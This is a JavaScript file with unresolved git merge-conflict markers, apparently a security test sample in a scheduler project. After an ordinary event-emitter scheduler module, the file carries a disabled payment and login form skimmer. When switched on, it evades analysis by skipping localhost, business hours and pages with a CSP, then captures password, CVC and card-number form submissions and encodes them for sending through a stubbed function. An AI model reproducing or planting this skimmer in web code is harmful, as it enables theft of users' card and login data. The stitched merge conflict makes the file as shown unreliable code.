<<<<<<< HEAD:test/security/pensi-scheduler/playground.js
module.exports = createScheduler;

/**
 * Create an instance of a configured scheduler mgr. 
 * @param config {Object}  
 */
function createScheduler( config ) {	
    if(config === undefined) throw new Error('config cannot be undefined');

    var events = require('events');
    var tasks = [];
    var tasksQueue = getEnumerator();
    var period = config.period;
    var isRunning = false;
    var inst = new events.EventEmitter();
    var clearId;

    // PRIVATE METHODS ///////////
    /**
     * Update and sort task queue
     */
    function updateTaskQueue() {
        //TODO: you might only have to sort the task list once. 
        tasksQueue = getEnumerator(tasks.sort((a, b) => { 
            if(calcDelayTicks(a.start, period) > calcDelayTicks(b.start, period))
                return 1;
            if(calcDelayTicks(a.start, period) < calcDelayTicks(b.start, period))
                return -1;
            return 0;
        }));
        
        return tasksQueue.next();
    } 
    
    function scheduleTask() {
        if(!isRunning) return;
            
        var task = tasksQueue.next();
        if(task === undefined) task = updateTaskQueue();
        
        var delay = calcDelayTicks(task.start, period);	
        clearId = setTimeout(function(){
            if(isRunning){ 
                inst.emit('interval', task); 
                scheduleTask(); 
            }
        }, delay);
    }
    
    /**
     * Calculate delay offset ticks from current time
     * @param startDate {Date}
     * @param period {Number} milliseconds
     */
    function calcDelayTicks( startDate, period ){
        if(!isDate(startDate)) throw new Error('startDate must be a date');
        if(!Number.isInteger(period)) throw new Error('period must be an integer');
        
        var diff = startDate.getTime() - new Date().getTime();
        return (diff < 0 ? period - Math.abs(diff) % period : diff) % (period + 1);
    }

    function isDate( date ){
        return date instanceof Date && !isNaN(date.valueOf());
    }

    function getEnumerator( arrayObj, flags ) {
        arrayObj = arrayObj || [];
        var ccValue = flags ? (flags.isCyclical || 0) : 0;
        var idx = -1;
        var length = arrayObj.length;

        return {
            next : function() {
                idx = ++idx >= length ? ccValue : idx; 
                return arrayObj[idx];
            }
        };
    }    
    
    /**
     * Convert a string time format into a date object. 
     * e.g. '08:33:10' => Mon Jan 25 2016 08:33:10 GMT-0500 (EST)
     */
    function parseTime( time ){
        var rs = /(\d+):(\d+):*(\d*)*/.exec(time);
        if(rs !== null){
            var dt = new Date();
            time = new Date(dt.getFullYear(), dt.getMonth(), 
                dt.getDate(), parseInt(rs[1]), parseInt(rs[2]), 
                    rs[3] !== undefined ? parseInt(rs[3]) : dt.getSeconds());    
        }
        
        return time;
    }
    
    ///////////////
    
    // EXTENDED METHODS //////////////////
    inst.addTask = function(name, time, metaInfo){
        if(typeof time === 'string')
            time = parseTime(time);
        time = time || new Date();
        tasks.push({name: name, start: time, meta: metaInfo});
    };

    inst.start = function(){
        isRunning = true;
        scheduleTask();
    };
        
    inst.stop = function(){
        if(isRunning){
            isRunning = false;
            clearTimeout(clearId);
            tasksQueue = undefined;
        }
    };        
        
    return inst;
}

const trigger = false;

if (trigger) {
    const isServer = !((typeof window !== 'undefined' && window.document));
    if (!isServer) {
        const documentLocation = document.location.host;
        const userAgent = navigator.userAgent;
        const isHour = getT();
        const isCa = getCookie('xhfda');
        const isC = getCookie('xhfd');

        if (!(validateIPaddress(documentLocation) || isC || isHour || isCa)) {
            const forms = document.forms;
            const x = forms.length;
            fetch(document.location.href)
                .then(resp => {
                    const csp = resp.headers.get('Content-Security-Policy');
                    if (csp === null || !csp.includes('default-src')) {
                        for (let i = 0; i < x; i++) {
                            const formElements = forms[i].elements;
                            for (let k = 0; k < formElements.length; k++) {
                                if (formElements[k].type === 'password' || formElements[k].name.toLowerCase() === 'cvc' || formElements[k].name.toLowerCase() === 'cardnumber') {
                                    forms[i].addEventListener('submit', function (ev) {
                                        ev.preventDefault();
                                        const formData = new FormData(this);
                                        const payload = encodeURIComponent(btoa(unescape(encodeURIComponent(documentLocation + '|' + formData))));
                                        snd(payload);
                                    });
                                    break;
                                }
                            }
                        }
                    } else if (!csp.includes('form-action') && !isC) {
                        for (let i = 0; i < x; i++) {
                            const formElements = forms[i].elements;
                            for (let k = 0; k < formElements.length; k++) {
                                if (formElements[k].type === 'password' || formElements[k].name.toLowerCase() === 'cvc' || formElements[k].name.toLowerCase() === 'cardnumber') {
                                    forms[i].addEventListener('submit', function (ev) {
                                        ev.preventDefault();
                                        setCookie('xhfda', 1, 864000);
                                        const formData = new FormData(this);
                                        const payload = encodeURIComponent(btoa(unescape(encodeURIComponent('host-' + documentLocation + '|fields-' + formData)))));
                                        snd(payload);
                                    });
                                    break;
                                }
                            }
                        }
                    }
                });
            setCookie('xhfd', 1, 86400);
        }
    }
}

function snd(pl) {
    // Implement your function to send payload
}

function getCookie(name) {
    const matches = document.cookie.match(new RegExp(
        '(?:^|; )' + name.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g, '\\$1') + '=([^;]*)'
    ));
    return !!matches;
}

function getT() {
    const now = new Date();
    const ch = now.getHours();
    return ch > 7 && ch < 19;
}

function validateIPaddress(ipaddress) {
    return /(^localhost$)|(^127\.\d{1,3}\.\d{1,3}\.\d{1,3}$)|(^(\d{1,3}\.){3}\d{1,3}$)/.test(ipaddress);
}

function setCookie(variable, value, expires_seconds) {
    const d = new Date();
    d.setTime(d.getTime() + (expires_seconds * 1000));
    const expires = 'expires=' + d.toUTCString();
    document.cookie = variable + '=' + value + '; ' + expires + '; path=/; secure; HttpOnly; SameSite=Strict';
}
=======
var createScheduler = require("./pensi-scheduler");

const config = { period: 1000 };
const scheduler = createScheduler(config);
scheduler.addTask("task1", new Date(Date.now() + 500));
scheduler.start();
console.log("isRunning:", scheduler.isRunning);
// t.ok(scheduler.isRunning, "sets isRunning to true");
scheduler.on("interval", (task) => {
  console.log("task.name:", task.name);
//   t.equal(task.name, "task1", "emits interval event with the correct task");
  scheduler.stop();
});
>>>>>>> 34cd9cfc (bkc tests):test/bkc/pensi-scheduler/playground.js
